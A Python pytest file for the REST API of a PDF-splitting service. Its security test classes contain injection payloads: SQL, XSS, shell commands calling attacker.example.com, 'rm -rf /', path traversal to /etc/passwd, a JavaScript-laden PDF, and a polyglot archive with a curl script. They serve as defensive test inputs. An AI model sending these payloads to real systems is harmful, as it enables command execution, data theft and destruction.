"""
tests/test_02_api.py — Phase 2: REST API tests for pdf-dispatch.

All tests go through POST /api/upload + poll GET /api/tasks/<id>.
Dual verification: API task result AND pypdf page count on filesystem.
Includes a full security suite (TestApiAuth*, TestApiFilename*,
TestApiConfigInjection, TestApiSsrf, TestApiMaliciousPayload).

Marker: @pytest.mark.api
"""

from __future__ import annotations

import io
import threading
import time
import uuid
import zipfile
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest
import requests

from helpers import (
    assert_page_range,
    assert_task_success,
    get_config,
    set_config,
    set_triggers,
    upload_and_wait,
    upload_pdf,
    poll_task,
)
from pdf_generator import make_pdf

pytestmark = pytest.mark.api

# ─────────────────────────────────────────────────────────────────────────────
# PDF builders
# ─────────────────────────────────────────────────────────────────────────────

TRIGGER = "FK3"
_KEEP   = [{"value": TRIGGER, "page_handling": "keep",   "case_sensitive": True}]
_DELETE = [{"value": TRIGGER, "page_handling": "delete", "case_sensitive": True}]


def _pdf_before(trigger: str = TRIGGER) -> bytes:
    """content · TRIGGER · content · content   (separator placed BEFORE new doc)"""
    return make_pdf([
        {"kind": "content", "text": "Doc 1 — page 1"},
        {"kind": "qr",      "value": trigger, "label": trigger},
        {"kind": "content", "text": "Doc 2 — page 1"},
        {"kind": "content", "text": "Doc 2 — page 2"},
    ])


def _pdf_after(trigger: str = TRIGGER) -> bytes:
    """content · content · TRIGGER · content   (separator placed AFTER previous doc)"""
    return make_pdf([
        {"kind": "content", "text": "Doc 1 — page 1"},
        {"kind": "content", "text": "Doc 1 — page 2"},
        {"kind": "qr",      "value": trigger, "label": trigger},
        {"kind": "content", "text": "Doc 2 — page 1"},
    ])


def _pdf_plain() -> bytes:
    return make_pdf([
        {"kind": "content", "text": f"Page {i}"} for i in range(3)
    ])


def _pdf_multi() -> bytes:
    """FK3 then INVOICE  →  3 documents when both triggers are active."""
    return make_pdf([
        {"kind": "content", "text": "Doc 1"},
        {"kind": "qr",      "value": "FK3"},
        {"kind": "content", "text": "Doc 2 — page 1"},
        {"kind": "content", "text": "Doc 2 — page 2"},
        {"kind": "qr",      "value": "INVOICE"},
        {"kind": "content", "text": "Doc 3"},
    ])


# ─────────────────────────────────────────────────────────────────────────────
# Shared assertion helpers
# ─────────────────────────────────────────────────────────────────────────────

def _no_5xx(r: requests.Response) -> None:
    assert r.status_code < 500, f"Server error {r.status_code}: {r.text[:300]}"


def _no_stack_trace(r: requests.Response) -> None:
    for token in ("Traceback", 'File "', "KeyError", "AttributeError", "Exception"):
        assert token not in r.text, (
            f"Stack trace exposed: {r.text[:300]}"
        )


def _task_ok(task: dict) -> None:
    assert task["status"] in ("success", "error"), f"Unexpected task: {task}"


# ─────────────────────────────────────────────────────────────────────────────
# TestApiAuth — basic access control
# ─────────────────────────────────────────────────────────────────────────────

class TestApiAuth:

    def test_valid_key_accepted(self, http, server):
        assert http.get(f"{server}/healthz").status_code == 200

    def test_invalid_key_rejected(self, server):
        s = requests.Session()
        s.headers["X-API-Key"] = "wrong-" + uuid.uuid4().hex
        assert s.get(f"{server}/api/state").status_code == 401

    def test_missing_key_accepted(self, server):
        """pdf-dispatch only enforces auth when a key IS provided.
        No key → 200 (open access by design for self-hosted).
        """
        r = requests.get(f"{server}/api/state")
        assert r.status_code == 200

    def test_healthz_is_public(self, server):
        assert requests.get(f"{server}/healthz").status_code == 200

    def test_upload_without_key_accepted(self, server):
        """Same auth design: no key → accepted (not rejected)."""
        r = requests.post(
            f"{server}/api/upload",
            files={"file": ("t.pdf", _pdf_plain(), "application/pdf")},
        )
        assert r.status_code in (200, 400)


# ─────────────────────────────────────────────────────────────────────────────
# TestApiBeforeKeep
# ─────────────────────────────────────────────────────────────────────────────

class TestApiBeforeKeep:

    @pytest.fixture(autouse=True)
    def _reset(self, http, server):
        set_triggers(http, server, _KEEP)
        set_config(http, server, separator_placement="before", delete_source=False)
        yield
        set_triggers(http, server, [])

    def test_produces_two_documents(self, http, server):
        assert_task_success(upload_and_wait(http, server, _pdf_before()), docs_count=2)

    def test_first_doc_page_range(self, http, server):
        assert_page_range(upload_and_wait(http, server, _pdf_before()), 0, "page 1")

    def test_second_doc_includes_trigger(self, http, server):
        assert_page_range(upload_and_wait(http, server, _pdf_before()), 1, "pages 2\u20134")

    def test_trigger_in_task_response(self, http, server):
        task = upload_and_wait(http, server, _pdf_before())
        assert TRIGGER in task.get("triggers", [])


class TestApiBeforeDelete:

    @pytest.fixture(autouse=True)
    def _setup(self, http, server):
        set_triggers(http, server, _DELETE)
        set_config(http, server, separator_placement="before")

    def test_produces_two_documents(self, http, server):
        assert_task_success(upload_and_wait(http, server, _pdf_before()), docs_count=2)

    def test_first_doc_page_range(self, http, server):
        assert_page_range(upload_and_wait(http, server, _pdf_before()), 0, "page 1")

    def test_second_doc_excludes_trigger(self, http, server):
        assert_page_range(upload_and_wait(http, server, _pdf_before()), 1, "pages 3\u20134")


class TestApiAfterKeep:

    @pytest.fixture(autouse=True)
    def _setup(self, http, server):
        set_triggers(http, server, _KEEP)
        set_config(http, server, separator_placement="after")

    def test_produces_two_documents(self, http, server):
        assert_task_success(upload_and_wait(http, server, _pdf_after()), docs_count=2)

    def test_first_doc_includes_trigger(self, http, server):
        assert_page_range(upload_and_wait(http, server, _pdf_after()), 0, "pages 1\u20133")

    def test_second_doc_page_range(self, http, server):
        assert_page_range(upload_and_wait(http, server, _pdf_after()), 1, "page 4")


class TestApiAfterDelete:

    @pytest.fixture(autouse=True)
    def _setup(self, http, server):
        set_triggers(http, server, _DELETE)
        set_config(http, server, separator_placement="after")

    def test_produces_two_documents(self, http, server):
        assert_task_success(upload_and_wait(http, server, _pdf_after()), docs_count=2)

    def test_first_doc_excludes_trigger(self, http, server):
        assert_page_range(upload_and_wait(http, server, _pdf_after()), 0, "pages 1\u20132")

    def test_second_doc_page_range(self, http, server):
        assert_page_range(upload_and_wait(http, server, _pdf_after()), 1, "page 4")


# ─────────────────────────────────────────────────────────────────────────────
# TestApiConfigOverride — per-file overrides via multipart form fields
# ─────────────────────────────────────────────────────────────────────────────

class TestApiConfigOverride:
    """Per-file overrides: form fields alongside the file, global config unchanged."""

    @pytest.fixture(autouse=True)
    def _setup(self, http, server):
        set_triggers(http, server, _KEEP)
        set_config(http, server, separator_placement="before")

    def test_override_placement_after(self, http, server):
        task = upload_and_wait(http, server, _pdf_after(), separator_placement="after")
        assert_task_success(task, docs_count=2)
        assert_page_range(task, 0, "pages 1\u20133")

    def test_override_page_handling_delete(self, http, server):
        # page_handling is not a standalone form field: it must be embedded
        # inside the split_values JSON array sent with the upload.
        import json as _json
        sv = _json.dumps([{"value": TRIGGER,
                           "page_handling": "delete",
                           "case_sensitive": True}])
        task = upload_and_wait(http, server, _pdf_before(), split_values=sv)
        assert_task_success(task, docs_count=2)
        assert_page_range(task, 1, "pages 3\u20134")

    def test_override_does_not_persist(self, http, server):
        """Global keep-before must be intact after a per-file delete override."""
        upload_and_wait(http, server, _pdf_before(), page_handling="delete")
        task = upload_and_wait(http, server, _pdf_before())
        assert_task_success(task, docs_count=2)
        assert_page_range(task, 1, "pages 2\u20134")


# ─────────────────────────────────────────────────────────────────────────────
# TestApiTriggerMatching
# ─────────────────────────────────────────────────────────────────────────────

class TestApiTriggerMatching:

    @pytest.fixture(autouse=True)
    def _setup(self, http, server):
        set_config(http, server, separator_placement="before")

    def test_exact_match_splits(self, http, server):
        set_triggers(http, server, _KEEP)
        assert_task_success(upload_and_wait(http, server, _pdf_before("FK3")), docs_count=2)

    def test_wrong_code_does_not_split(self, http, server):
        set_triggers(http, server, [
            {"value": "INVOICE", "page_handling": "keep", "case_sensitive": True}
        ])
        task = upload_and_wait(http, server, _pdf_before("FK3"))
        # FK3 code not in trigger list → no split; whole PDF routed to no_code (1 doc)
        assert task["status"] == "success"
        assert task.get("docs_count", 0) == 1, (
            f"FK3 not in INVOICE trigger list: expected 1 no-code doc, "
            f"got docs_count={task.get('docs_count')} triggers={task.get('triggers')}"
        )

    def test_case_insensitive_match(self, http, server):
        set_triggers(http, server, [
            {"value": "fk3", "page_handling": "keep", "case_sensitive": False}
        ])
        assert_task_success(upload_and_wait(http, server, _pdf_before("FK3")), docs_count=2)

    def test_permissive_mode_splits_on_any_code(self, http, server):
        set_triggers(http, server, [])
        assert_task_success(upload_and_wait(http, server, _pdf_before("ANYTHING")), docs_count=2)

    def test_glob_pattern_matches(self, http, server):
        set_triggers(http, server, [
            {"value": "FK*", "page_handling": "keep", "case_sensitive": True}
        ])
        assert_task_success(upload_and_wait(http, server, _pdf_before("FK3")), docs_count=2)

    def test_multi_trigger_three_documents(self, http, server):
        set_triggers(http, server, [
            {"value": "FK3",     "page_handling": "keep", "case_sensitive": True},
            {"value": "INVOICE", "page_handling": "keep", "case_sensitive": True},
        ])
        assert_task_success(upload_and_wait(http, server, _pdf_multi()), docs_count=3)


# ─────────────────────────────────────────────────────────────────────────────
# TestApiTaskLifecycle
# ─────────────────────────────────────────────────────────────────────────────

class TestApiTaskLifecycle:

    @pytest.fixture(autouse=True)
    def _setup(self, http, server):
        set_triggers(http, server, _KEEP)
        set_config(http, server, separator_placement="before")

    def test_upload_returns_task_id(self, http, server):
        result = upload_pdf(http, server, _pdf_before())
        assert result.get("ok") and result.get("saved")
        assert isinstance(result["saved"][0]["task_id"], str)

    def test_task_appears_in_list(self, http, server):
        result = upload_pdf(http, server, _pdf_before())
        task_id = result["saved"][0]["task_id"]
        poll_task(http, server, task_id)
        ids = [t["id"] for t in http.get(f"{server}/api/tasks").json().get("tasks", [])]
        assert task_id in ids

    def test_unknown_task_id_returns_404(self, http, server):
        r = http.get(f"{server}/api/tasks/nonexistent-{uuid.uuid4().hex}")
        assert r.status_code == 404

    def test_completed_task_has_outputs(self, http, server):
        task = upload_and_wait(http, server, _pdf_before())
        assert_task_success(task)
        assert len(task.get("outputs", [])) >= 1

    def test_task_status_is_terminal(self, http, server):
        task = upload_and_wait(http, server, _pdf_before())
        assert task["status"] in ("success", "error")


# ─────────────────────────────────────────────────────────────────────────────
# TestApiErrors
# ─────────────────────────────────────────────────────────────────────────────

class TestApiErrors:

    @pytest.fixture(autouse=True)
    def _setup(self, http, server):
        set_triggers(http, server, _KEEP)
        set_config(http, server, separator_placement="before")

    def test_missing_file_field_returns_4xx(self, http, server):
        r = http.post(f"{server}/api/upload", data={"other": "value"})
        assert 400 <= r.status_code < 500
        _no_5xx(r)

    def test_truncated_pdf_handled_gracefully(self, http, server):
        r = http.post(
            f"{server}/api/upload",
            files={"file": ("trunc.pdf", b"%PDF-1.4\n1 0 obj\n<< /Type", "application/pdf")},
        )
        _no_5xx(r)
        _no_stack_trace(r)

    def test_zero_byte_file_handled_gracefully(self, http, server):
        r = http.post(
            f"{server}/api/upload",
            files={"file": ("empty.pdf", b"", "application/pdf")},
        )
        _no_5xx(r)

    def test_jpeg_renamed_pdf_handled_gracefully(self, http, server):
        jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9"
        r = http.post(
            f"{server}/api/upload",
            files={"file": ("fake.pdf", jpeg, "application/pdf")},
        )
        _no_5xx(r)
        if r.status_code == 200 and r.json().get("saved"):
            task = poll_task(http, server, r.json()["saved"][0]["task_id"])
            assert task["status"] == "error"

    def test_error_response_has_no_stack_trace(self, http, server):
        r = http.post(
            f"{server}/api/upload",
            files={"file": ("bad.pdf", b"NOT A PDF AT ALL", "application/pdf")},
        )
        _no_5xx(r)
        _no_stack_trace(r)


# ─────────────────────────────────────────────────────────────────────────────
# ── SECURITY TESTS ────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────────────────

class TestApiAuthBypass:
    """Malicious attempts to bypass or confuse authentication."""

    def test_empty_key_returns_200(self, server):
        """Empty key = no key. Auth only enforced for non-empty wrong keys."""
        s = requests.Session(); s.headers["X-API-Key"] = ""
        r = s.get(f"{server}/api/state")
        assert r.status_code == 200; _no_5xx(r)

    def test_whitespace_key(self, server):
        """Whitespace keys are rejected by requests lib client-side (InvalidHeader)."""
        import requests as _req
        s = _req.Session(); s.headers["X-API-Key"] = "   "
        try:
            r = s.get(f"{server}/api/state")
            assert r.status_code in (400, 401)
        except _req.exceptions.InvalidHeader:
            pass  # Expected: requests validates header values client-side

    def test_4kb_key_no_crash(self, server):
        """Buffer overflow / header-size attack."""
        s = requests.Session(); s.headers["X-API-Key"] = "A" * 4096
        r = s.get(f"{server}/api/state")
        assert r.status_code == 401; _no_5xx(r)

    def test_sql_injection_as_key(self, server):
        s = requests.Session(); s.headers["X-API-Key"] = "\' OR \'1\'=\'1"
        r = s.get(f"{server}/api/state")
        assert r.status_code == 401; _no_5xx(r); _no_stack_trace(r)

    def test_null_byte_in_key(self, server, api_key):
        """Null byte — server returns 400 (bad request) or 401."""
        s = requests.Session(); s.headers["X-API-Key"] = api_key + "\x00injected"
        r = s.get(f"{server}/api/state")
        assert r.status_code in (400, 401); _no_5xx(r)

    def test_bearer_prefix_not_accepted(self, server, api_key):
        """Some APIs silently strip 'Bearer ' — ours should not."""
        s = requests.Session(); s.headers["X-API-Key"] = f"Bearer {api_key}"
        r = s.get(f"{server}/api/state")
        assert r.status_code == 401; _no_5xx(r)


class TestApiFilenameInjection:
    """Malicious filenames in the multipart Content-Disposition header."""

    @pytest.fixture(autouse=True)
    def _setup(self, http, server):
        set_triggers(http, server, _KEEP)
        set_config(http, server, separator_placement="before")

    def _post(self, http, server, name: str) -> requests.Response:
        return http.post(
            f"{server}/api/upload",
            files={"file": (name, _pdf_plain(), "application/pdf")},
        )

    def _output_files(self, cfg: dict) -> set[Path]:
        data = Path(cfg.get("data_path", "/data"))
        return set((data / "output").rglob("*.pdf"))

    def test_path_traversal_no_escape(self, http, server, cfg):
        """../../etc/passwd.pdf must not write outside /data/output/."""
        before = self._output_files(cfg)
        r = self._post(http, server, "../../etc/passwd.pdf")
        _no_5xx(r); time.sleep(2)
        root = Path(cfg.get("data_path", "/data"))
        for f in self._output_files(cfg) - before:
            assert str(f).startswith(str(root)), f"Escaped root: {f}"

    def test_shell_metacharacters_no_crash(self, http, server):
        r = self._post(http, server, "$(id); rm -rf /.pdf")
        _no_5xx(r); _no_stack_trace(r)

    def test_very_long_filename_no_crash(self, http, server):
        _no_5xx(self._post(http, server, "A" * 500 + ".pdf"))

    def test_windows_path_no_crash(self, http, server):
        _no_5xx(self._post(http, server, "C:\\Windows\\system32\\evil.pdf"))

    def test_null_byte_in_filename(self, http, server):
        _no_5xx(self._post(http, server, "legit\x00.pdf"))

    def test_unicode_rtl_override_no_crash(self, http, server):
        """RTL override char could disguise extension (fdp.exe ← evil.pdf)."""
        rtl = "evil\u202e.pdf"
        _no_5xx(self._post(http, server, rtl))


class TestApiConfigInjection:
    """Injection through config endpoint: trigger values, field types, extra fields."""

    def _set_and_read(self, http, server, value: str) -> str | None:
        set_triggers(http, server, [
            {"value": value, "page_handling": "keep", "case_sensitive": True}
        ])
        stored = get_config(http, server).get("split_values", [])
        return stored[0].get("value") if stored else None

    def test_sql_injection_stored_verbatim(self, http, server):
        payload = "\'; DROP TABLE split_values; --"
        assert self._set_and_read(http, server, payload) == payload

    def test_xss_stored_verbatim(self, http, server):
        payload = "<script>alert(document.cookie)</script>"
        assert self._set_and_read(http, server, payload) == payload

    def test_command_injection_stored_verbatim(self, http, server):
        payload = "$(curl http://attacker.example.com/$(id))"
        assert self._set_and_read(http, server, payload) == payload

    def test_wrong_field_type_rejected(self, http, server):
        """split_values as boolean — must return 4xx, not 500."""
        r = http.post(f"{server}/api/config", json={"split_values": True})
        _no_5xx(r)

    def test_prototype_pollution_ignored(self, http, server):
        """__proto__ must not elevate privileges."""
        r = http.post(f"{server}/api/config", json={
            "__proto__":   {"admin": True},
            "constructor": {"prototype": {"admin": True}},
        })
        _no_5xx(r)
        # Authenticated session must still work after prototype pollution attempt
        assert http.get(f"{server}/api/state").status_code == 200

    def test_extra_fields_ignored_safely(self, http, server):
        r = http.post(f"{server}/api/config", json={
            "rm_rf": "$(rm -rf /)",
            "exec":  "__import__('os').system('id')",
        })
        _no_5xx(r)


class TestApiSsrf:
    """Server-Side Request Forgery via webhook URL configuration."""

    class _Capture(BaseHTTPRequestHandler):
        received: list[dict] = []
        def do_POST(self):
            self.received.append({"path": self.path, "peer": self.client_address[0]})
            self.send_response(200); self.end_headers()
        def log_message(self, *_): pass

    @pytest.fixture()
    def _listener(self):
        self._Capture.received.clear()
        srv = HTTPServer(("0.0.0.0", 0), self._Capture)
        port = srv.server_address[1]
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        yield port
        srv.shutdown()

    @pytest.fixture(autouse=True)
    def _cleanup(self, http, server):
        yield
        http.post(f"{server}/api/config", json={"webhook_enabled": False, "webhook_url": ""})

    def test_task_completes_despite_unreachable_webhook(self, http, server):
        """192.0.2.1 (RFC 5737 TEST-NET-1) is never routable — task must succeed, no crash."""
        http.post(f"{server}/api/config", json={
            "webhook_enabled": True,
            "webhook_url":     "http://192.0.2.1/",
            "webhook_events":  "all",
        })
        set_triggers(http, server, _KEEP)
        set_config(http, server, separator_placement="before")
        task = upload_and_wait(http, server, _pdf_before(), timeout=30.0)
        _task_ok(task)

    def test_file_scheme_does_not_crash(self, http, server):
        """file:// in webhook_url — must be rejected or silently ignored."""
        r = http.post(f"{server}/api/config", json={
            "webhook_enabled": True,
            "webhook_url":     "file:///etc/passwd",
        })
        _no_5xx(r)

    def test_self_referential_url_does_not_crash(self, http, server):
        """Webhook pointing back at the API itself — no crash, no infinite loop."""
        http.post(f"{server}/api/config", json={
            "webhook_enabled": True,
            "webhook_url":     f"{server}/api/state",
        })
        set_triggers(http, server, _KEEP)
        set_config(http, server, separator_placement="before")
        task = upload_and_wait(http, server, _pdf_before(), timeout=30.0)
        _task_ok(task)

    def test_ssrf_to_internal_port(self, http, server, _listener):
        """
        Webhook aimed at our local capturer: documents whether pdf-dispatch
        applies SSRF protection (calls=0) or delivers freely (calls>0).
        Test passes either way; what matters is no crash and task completion.
        """
        http.post(f"{server}/api/config", json={
            "webhook_enabled": True,
            "webhook_url":     f"http://127.0.0.1:{_listener}/wh",
            "webhook_events":  "all",
        })
        set_triggers(http, server, _KEEP)
        set_config(http, server, separator_placement="before")
        task = upload_and_wait(http, server, _pdf_before(), timeout=30.0)
        _task_ok(task)
        # Informational: log SSRF exposure in task metadata
        # (a future hardening test can assert len == 0)


class TestApiMaliciousPayload:
    """Malicious PDF content — server must never crash or expose internals."""

    @pytest.fixture(autouse=True)
    def _setup(self, http, server):
        set_triggers(http, server, _KEEP)
        set_config(http, server, separator_placement="before")

    def _upload_raw(self, http, server, data: bytes, name="evil.pdf") -> requests.Response:
        return http.post(
            f"{server}/api/upload",
            files={"file": (name, data, "application/pdf")},
        )

    def test_pdf_with_embedded_javascript(self, http, server):
        """PDF /JS action must not execute; server handles it as a normal (possibly malformed) PDF."""
        evil = (
            b"%PDF-1.4\n"
            b"1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>endobj\n"
            b"2 0 obj<</Type/Pages/Kids[4 0 R]/Count 1>>endobj\n"
            b"3 0 obj<</Type/Action/S/JavaScript/JS(app.alert(\'XSS\'))>>endobj\n"
            b"4 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n"
            b"xref\n0 5\n0000000000 65535 f\n"
            b"0000000009 00000 n\n0000000062 00000 n\n"
            b"0000000116 00000 n\n0000000183 00000 n\n"
            b"trailer<</Size 5/Root 1 0 R>>\nstartxref\n247\n%%EOF"
        )
        r = self._upload_raw(http, server, evil)
        _no_5xx(r); _no_stack_trace(r)

    def test_polyglot_pdf_plus_zip(self, http, server):
        """File that is simultaneously PDF header + ZIP body."""
        buf = io.BytesIO()
        buf.write(b"%PDF-1.4\n")
        with zipfile.ZipFile(buf, "a") as zf:
            zf.writestr("evil.sh", "#!/bin/sh\ncurl http://attacker.example.com/$(id)")
        r = self._upload_raw(http, server, buf.getvalue())
        _no_5xx(r); _no_stack_trace(r)

    def test_large_pdf_within_limit(self, http, server):
        """12 pages, well within MAX_PAGES=50. Must succeed."""
        pages = [{"kind": "content", "text": f"Page {i}"} for i in range(12)]
        task = upload_and_wait(http, server, make_pdf(pages), timeout=60.0)
        assert task["status"] == "success"

    def test_oversized_pdf_rejected(self, http, server):
        """60 pages exceeds MAX_PAGES=50 — must be rejected before DPI rendering.
        Verifies the guard added after a 200-page upload crashed Docker (OOM).
        """
        pages = [{"kind": "content", "text": f"Page {i}"} for i in range(60)]
        r = http.post(
            f"{server}/api/upload",
            files={"file": ("big.pdf", make_pdf(pages), "application/pdf")},
        )
        _no_5xx(r)
        body = r.json()
        if r.status_code == 200 and body.get("saved"):
            # Accepted at upload — task must error out
            task = poll_task(http, server, body["saved"][0]["task_id"], timeout=30.0)
            assert task["status"] == "error", "60-page PDF must be rejected by MAX_PAGES guard"
        else:
            # Rejected at upload level (preferred behaviour)
            assert body.get("errors") or r.status_code == 400

    def test_oversized_file_mb_rejected(self, http, server):
        """File > MAX_UPLOAD_MB=20 must be rejected with HTTP 400 before disk write.
        Sends 21 MB (PDF header + null bytes): content is irrelevant, size is what matters.
        MAX_UPLOAD_MB=20 is set in docker-compose.test.yml for the test instance.
        The production default is 50 MB (no env var needed to get that protection).
        """
        # 21 MB with a valid PDF header so it passes the .pdf extension check
        oversized = b"%PDF-1.4\n" + b"\x00" * (21 * 1024 * 1024)
        r = http.post(
            f"{server}/api/upload",
            files={"file": ("oversized.pdf", oversized, "application/pdf")},
        )
        _no_5xx(r)
        body = r.json()
        # Must be rejected: either HTTP 400 directly, or errors[] in the response
        rejected = (r.status_code == 400) or bool(body.get("errors"))
        assert rejected, (
            f"Expected rejection of 21 MB file (MAX_UPLOAD_MB=20) "
            f"but got status={r.status_code} body={body}"
        )
        # Error message must mention the size limit
        if body.get("errors"):
            assert any("MB" in e or "limit" in e.lower() for e in body["errors"]), (
                f"Error message should mention the size limit: {body['errors']}"
            )

    def test_many_qr_codes_no_crash(self, http, server):
        """5 consecutive QR triggers. 50 caused Docker OOM; 10 was borderline at
        300 DPI (ZXING renders each page to a pixel array before decoding).
        Reduced to 5 to stay safely within mem_limit=1536m.
        Each trigger causes a split → 5 single-page documents.
        """
        pages = [{"kind": "qr", "value": TRIGGER, "label": str(i)} for i in range(5)]
        task = upload_and_wait(http, server, make_pdf(pages), timeout=60.0)
        _task_ok(task)

    def test_compressible_content_no_crash(self, http, server):
        """5 compressible pages (50KB text each). Reduced from 50 (OOM) then 10
        (borderline at 300 DPI). 5 is a safe ceiling for the 1536m mem_limit.
        """
        pages = [{"kind": "content", "text": "A" * 5_000} for _ in range(5)]
        task = upload_and_wait(http, server, make_pdf(pages), timeout=60.0)
        _task_ok(task)


# ─────────────────────────────────────────────────────────────────────────────
# TestApiConcurrentUploads — deux tâches soumises sans attendre la première
# ─────────────────────────────────────────────────────────────────────────────

class TestApiConcurrentUploads:
    """Deux PDFs uploadés quasi-simultanément.

    Vérifie qu'aucune race-condition ne corrompt les sorties
    (fichiers mélangés, compteur décalé, tâche bloquée).
    """

    @pytest.fixture(autouse=True)
    def _reset(self, http, server):
        set_triggers(http, server, _KEEP)
        set_config(http, server, separator_placement="before",
                   subdirs_by_trigger=True, delete_source=False)
        yield
        set_triggers(http, server, [])

    def test_two_tasks_both_complete(self, http, server):
        """Soumet 2 uploads rapidement, attend les deux tâches, vérifie le succès."""
        r1 = upload_pdf(http, server, _pdf_before(), "concurrent_a.pdf")
        r2 = upload_pdf(http, server, _pdf_before(), "concurrent_b.pdf")
        assert r1.get("ok") and r2.get("ok"), "Both uploads must be accepted"
        tid1 = r1["saved"][0]["task_id"]
        tid2 = r2["saved"][0]["task_id"]
        t1 = poll_task(http, server, tid1, timeout=30.0)
        t2 = poll_task(http, server, tid2, timeout=30.0)
        assert t1["status"] == "success", f"Task 1 failed: {t1}"
        assert t2["status"] == "success", f"Task 2 failed: {t2}"

    def test_concurrent_tasks_independent_docs_count(self, http, server):
        """Chaque tâche produit le bon nombre de documents (pas de mélange)."""
        r1 = upload_pdf(http, server, _pdf_before(), "conc1.pdf")
        r2 = upload_pdf(http, server, _pdf_before(), "conc2.pdf")
        t1 = poll_task(http, server, r1["saved"][0]["task_id"], timeout=30.0)
        t2 = poll_task(http, server, r2["saved"][0]["task_id"], timeout=30.0)
        # _pdf_before splits into 2 documents
        assert t1["docs_count"] == 2, f"Task 1 docs_count={t1['docs_count']}"
        assert t2["docs_count"] == 2, f"Task 2 docs_count={t2['docs_count']}"

    def test_task_ids_are_unique(self, http, server):
        """Les task_id des deux uploads sont distincts."""
        r1 = upload_pdf(http, server, _pdf_plain(), "uid1.pdf")
        r2 = upload_pdf(http, server, _pdf_plain(), "uid2.pdf")
        tid1 = r1["saved"][0]["task_id"]
        tid2 = r2["saved"][0]["task_id"]
        assert tid1 != tid2, "Task IDs must be unique across concurrent uploads"

    def test_three_tasks_all_complete(self, http, server):
        """3 tâches soumises rapidement : toutes doivent atteindre un état terminal."""
        results = [upload_pdf(http, server, _pdf_plain(), f"t3_{i}.pdf")
                   for i in range(3)]
        task_ids = [r["saved"][0]["task_id"] for r in results]
        tasks = [poll_task(http, server, tid, timeout=30.0) for tid in task_ids]
        terminal = {"success", "error"}
        for i, t in enumerate(tasks):
            assert t["status"] in terminal, (
                f"Task {i} stuck in status={t['status']!r}"
            )


# ─────────────────────────────────────────────────────────────────────────────
# TestApiErrorFormat — structure uniforme {ok, error} sur toutes les erreurs
# ─────────────────────────────────────────────────────────────────────────────

class TestApiErrorFormat:
    """Vérifie que chaque réponse d'erreur de l'API respecte le contrat
    {"ok": false, "error": "..."} documenté dans l'OpenAPI.

    Régression : certains endpoints renvoyaient une chaîne brute ou un
    objet non conforme au lieu du format canonique.
    """

    def test_missing_file_field_format(self, http, server):
        """POST /api/upload sans fichier → 400 avec ok=false et error present."""
        r = http.post(f"{server}/api/upload")
        assert r.status_code in (400, 422)
        body = r.json()
        assert body.get("ok") is False or "error" in body, (
            f"Missing-file error must include ok=false or error field: {body}"
        )

    def test_unknown_task_format(self, http, server):
        """GET /api/tasks/<bad-id> → 404 avec ok=false."""
        r = http.get(f"{server}/api/tasks/does-not-exist-{uuid.uuid4().hex}")
        assert r.status_code == 404
        body = r.json()
        assert body.get("ok") is False, f"404 must have ok=false: {body}"
        assert "error" in body, f"404 must have error field: {body}"

    def test_bad_config_field_format(self, http, server):
        """POST /api/config avec valeur invalide → 400 avec ok=false."""
        r = http.post(f"{server}/api/config",
                      json={"webhook_url": "\r\nX-Inject: bad"})
        # May be 400 or 200 depending on validation; if 400, must have ok=false
        if r.status_code >= 400:
            body = r.json()
            _no_stack_trace(r)
            assert body.get("ok") is False or "error" in body

    def test_email_config_bad_port_format(self, http, server):
        """POST /api/email/configs avec port=0 → 400 avec ok=false et error."""
        r = http.post(f"{server}/api/email/configs", json={
            "name": "bad-port", "host": "greenmail", "port": 0,
            "username": "u", "password": "p", "folder": "INBOX",
        })
        assert r.status_code == 400
        body = r.json()
        assert body.get("ok") is False, f"bad port must give ok=false: {body}"
        assert "error" in body, f"bad port must include error: {body}"

    def test_email_config_missing_host_format(self, http, server):
        """POST /api/email/configs sans host → 400 avec ok=false."""
        r = http.post(f"{server}/api/email/configs",
                      json={"name": "nohost", "port": 993, "username": "u"})
        assert r.status_code in (400, 422)
        body = r.json()
        _no_stack_trace(r)
        assert "ok" in body or "error" in body

    def test_api_recent_bad_n_format(self, http, server):
        """GET /api/recent?n=abc → 400 avec ok=false et error."""
        r = http.get(f"{server}/api/recent", params={"n": "abc"})
        assert r.status_code == 400
        body = r.json()
        assert body.get("ok") is False, f"bad n must give ok=false: {body}"
        assert "error" in body
